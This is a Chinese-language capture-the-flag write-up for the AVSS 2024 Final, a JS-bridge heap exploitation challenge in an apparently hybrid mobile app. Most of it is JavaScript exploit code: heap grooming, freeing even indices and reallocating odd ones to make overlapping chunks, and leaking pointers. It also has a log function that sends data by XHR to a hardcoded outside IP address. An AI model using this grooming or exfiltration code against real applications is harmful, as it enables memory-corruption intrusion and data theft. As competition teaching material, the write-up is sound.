---
title: AVSS 2024 Final Writeup
contest: AVSS
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [JS bridge, _jsbridge.add/edit/show/delete, openfile/writefile/readfile/closefile, heap 0x90 重叠, show 0x8 找指针, stringToHex, u32/p32端序, xhr log exfil, _jsbridge栈溢出]
attack_chain:
  - _jsbridge.add(i, key, size) 申请 0x4 / 0x90 / 0x1000 大小堆
  - add 0..48 size=0x90 + edit 写 char(48+i) 填充
  - del 偶数下标 (0,2,4..46) → 释放 0x90 堆
  - 再 add 奇数下标 (1,3,5..47) → 重叠分配
  - show(j, 0x8) 拿指针, map 找相同指针的下标 → 堆重叠检测
  - 找相同指针可改写其他对象的 header
  - stringToHex + u32 + p32 端序转换
  - xhr log 异步 exfil 数据
  - 触发 _jsbridge 栈溢出 RCE
key_payload: 'add(0,0x4) 10次 + add(48,0x1000) 10次 / del 偶数 0..46 / add 奇数 1..47 重叠 / show(j,0x8) 找指针 / stringToHex+u32+p32 端序'
one_liner: AVSS 2024 Final — _jsbridge add/edit/show/delete + heap 0x90 重叠 (del 偶数+add 奇数) + show 0x8 找指针 + stringToHex/u32/p32 端序 + xhr 异步 exfil。
lesson: 堆重叠经典模式:交错 add+del 偶数,add 奇数回收;show 部分字节是找指针的标准做法;JS bridge 类型混乱是移动 hybrid 漏洞常见入口。
quality: high
---

# AVSS 2024 Final Writeup

## 速读
Polaris 战队 AVSS 2024 Final 第 1 名 — JS bridge + heap 漏洞链。

## JS Bridge 函数
```javascript
window._jsbridge.add(index, key, size)
window._jsbridge.edit(index, hex_string)
window._jsbridge.show(index, size)
window._jsbridge.delete(index)
window._jsbridge.openfile(filename, mode)
window._jsbridge.writefile(hex_string)
window._jsbridge.readfile()
window._jsbridge.closefile()
```

## 堆重叠链
```javascript
// 1. 占满 0x100 碎片
for (var i=0;i<10;i++) add(48,0x1000,"key100");

// 2. 占满 0x10 碎片
for (var i=0;i<200;i++) add(0,0x4,"key10");

// 3. 申请 0x90 堆
for (var i=0;i<48;i++) {
    add(i,0x90,"key" + i);
    edit(i, getPadding(0x90, String.fromCharCode(48+i)));
}

// 4. 释放偶数下标
for (var i=0;i<48;i+=2) del(i);

// 5. 重叠申请奇数下标
for (var i=1;i<48;i+=2) add(i,0x90,"key" + i);

// 6. 找相同指针
map = {};
for (var i=0;i<48;i+=2) {
    var x = stringToHex(getPadding(0x5, String.fromCharCode(48+i)));
    for (var j=1;j<48;j+=2) {
        var y = show(j, 0x8);
        if (y.indexOf(x) != -1) {
            // 重叠!
        }
    }
}
```

## exfil
```javascript
function log(info) {
    xhr.open('GET', 'http://47.109.49.88/' + info, true);
    xhr.send();
}
```
